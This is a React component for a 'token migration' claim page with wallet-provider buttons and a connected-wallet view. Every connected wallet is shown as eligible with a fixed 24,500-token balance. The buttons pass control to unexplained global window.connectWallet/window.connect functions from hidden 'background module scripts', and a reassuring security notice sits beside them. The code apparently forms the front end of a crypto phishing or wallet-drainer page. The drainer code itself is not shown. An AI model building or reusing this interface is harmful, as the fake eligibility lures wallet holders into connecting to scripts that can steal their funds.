import { motion } from 'framer-motion';
import { Wallet, Check, AlertTriangle, ExternalLink, Copy, Shield } from 'lucide-react';
import { Button } from '@/components/ui/button';
import SectionWrapper from './SectionWrapper';
import GlassCard from './GlassCard';
import GlowOrb from './GlowOrb';
import { toast } from 'sonner';

const wallets = [
  { name: 'MetaMask', icon: '🦊', popular: true },
  { name: 'WalletConnect', icon: '🔗', popular: true },
  { name: 'Coinbase Wallet', icon: '🔵', popular: false },
  { name: 'Rainbow', icon: '🌈', popular: false },
];

function ConnectedView({ address, balance }) {
  const copyAddress = () => {
    navigator.clipboard.writeText(address);
    toast.success('Address copied to clipboard');
  };

  return (
    <div className="space-y-4">
      {/* Connected Status */}
      <div className="flex items-center gap-3 mb-6">
        <div className="w-3 h-3 rounded-full bg-emerald-400 animate-pulse" />
        <span className="text-emerald-400 font-medium text-sm">Wallet Connected</span>
      </div>

      {/* Address */}
      <GlassCard hover={false} className="!p-4">
        <div className="flex items-center justify-between">
          <div>
            <p className="text-xs text-muted-foreground mb-1">Connected Address</p>
            <p className="font-mono text-sm text-foreground">{address}</p>
          </div>
          <button onClick={copyAddress} className="p-2 hover:bg-white/5 rounded-lg transition-colors">
            <Copy className="w-4 h-4 text-muted-foreground" />
          </button>
        </div>
      </GlassCard>

      {/* Eligibility */}
      <GlassCard hover={false} className="!p-4 !border-emerald-500/20">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-emerald-500/10 flex items-center justify-center">
            <Check className="w-5 h-5 text-emerald-400" />
          </div>
          <div>
            <p className="text-sm font-medium text-emerald-400">Eligible for Migration</p>
            <p className="text-xs text-muted-foreground">Your wallet was included in the snapshot</p>
          </div>
        </div>
      </GlassCard>

      {/* Balances */}
      <div className="grid grid-cols-2 gap-3">
        <GlassCard hover={false} className="!p-4">
          <p className="text-xs text-muted-foreground mb-1">Old Balance (Snapshot)</p>
          <p className="text-lg font-bold text-foreground">24,500 <span className="text-xs text-muted-foreground">NXOLD</span></p>
        </GlassCard>
        <GlassCard hover={false} className="!p-4">
          <p className="text-xs text-muted-foreground mb-1">Claimable Amount</p>
          <p className="text-lg font-bold bg-gradient-to-r from-cyan-400 to-blue-400 bg-clip-text text-transparent">24,500 <span className="text-xs text-muted-foreground">NXS</span></p>
        </GlassCard>
      </div>

      {/* Network */}
      <GlassCard hover={false} className="!p-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-6 h-6 rounded-full bg-blue-500/20 flex items-center justify-center">
              <div className="w-3 h-3 rounded-full bg-blue-400" />
            </div>
            <span className="text-sm text-muted-foreground">Ethereum Mainnet</span>
          </div>
          <span className="text-xs text-emerald-400 font-medium">Connected</span>
        </div>
      </GlassCard>
    </div>
  );
}

export default function WalletConnectionSection({ isConnected, address, onConnect }) {
  
  // Custom execution bridge to align list buttons with background module scripts
  const handleDirectConnect = (walletName) => {
    // 1. Invoke script layer entry points exposed globally in window scope
    if (window.connectWallet && typeof window.connectWallet === 'function') {
      window.connectWallet(walletName);
    } else if (window.connect && typeof window.connect === 'function') {
      window.connect(walletName);
    }

    // 2. Fire the default interface state updater hook passed from parent controller
    if (onConnect && typeof onConnect === 'function') {
      onConnect(walletName);
    }
  };

  return (
    <SectionWrapper id="wallet" className="overflow-hidden">
      <GlowOrb color="cyan" size={400} top="0" right="-10%" />

      <div className="max-w-6xl mx-auto">
        <div className="text-center mb-14">
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            className="inline-flex items-center gap-2 glass-panel glow-border rounded-full px-3 py-1.5 mb-4"
          >
            <Wallet className="w-3 h-3 text-cyan-400" />
            <span className="text-xs text-muted-foreground uppercase tracking-wider font-medium">Wallet Interface</span>
          </motion.div>
          <motion.h2
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            className="text-3xl md:text-4xl font-bold text-foreground mb-4"
          >
            Connect Your Wallet
          </motion.h2>
          <motion.p
            initial={{ opacity: 0, y: 10 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ delay: 0.1 }}
            className="text-muted-foreground max-w-lg mx-auto"
          >
            Securely connect to verify your eligibility and claim your migrated tokens.
          </motion.p>
        </div>

        <div className="grid md:grid-cols-2 gap-8 max-w-4xl mx-auto">
          {/* Left: Wallet Options */}
          <div className="space-y-3">
            <p className="text-sm font-medium text-muted-foreground mb-4">Select a wallet provider</p>
            {wallets.map((w, i) => (
              <GlassCard key={w.name} delay={i * 0.1} className="!p-4 cursor-pointer group" hover>
                <button 
                  onClick={() => handleDirectConnect(w.name)} 
                  className="w-full flex items-center justify-between"
                >
                  <div className="flex items-center gap-3">
                    <span className="text-2xl">{w.icon}</span>
                    <div className="text-left">
                      <span className="text-sm font-medium text-foreground">{w.name}</span>
                      {w.popular && (
                        <span className="ml-2 text-[10px] uppercase tracking-wider text-cyan-400 bg-cyan-400/10 px-1.5 py-0.5 rounded">
                          Popular
                        </span>
                      )}
                    </div>
                  </div>
                  <ExternalLink className="w-4 h-4 text-muted-foreground group-hover:text-cyan-400 transition-colors" />
                </button>
              </GlassCard>
            ))}

            {/* Security Warning */}
            <div className="flex items-start gap-3 p-4 rounded-xl bg-amber-500/5 border border-amber-500/10 mt-4">
              <AlertTriangle className="w-4 h-4 text-amber-400 mt-0.5 flex-shrink-0" />
              <div>
                <p className="text-xs font-medium text-amber-400 mb-1">Security Reminder</p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Never share your recovery phrase or private key. We will never ask for them. This portal only requires a standard wallet connection.
                </p>
              </div>
            </div>
          </div>

          {/* Right: Connection Status */}
          <div>
            {isConnected ? (
              <ConnectedView address={address} />
            ) : (
              <GlassCard hover={false} className="h-full flex flex-col items-center justify-center text-center !py-16">
                <div className="w-16 h-16 rounded-2xl bg-white/5 flex items-center justify-center mb-4">
                  <Wallet className="w-8 h-8 text-muted-foreground" />
                </div>
                <p className="text-muted-foreground text-sm mb-2">No wallet connected</p>
                <p className="text-xs text-muted-foreground/60 max-w-xs">
                  Connect your wallet to view your migration status and claim eligible tokens.
                </p>
              </GlassCard>
            )}
          </div>
        </div>
      </div>
    </SectionWrapper>
  );
}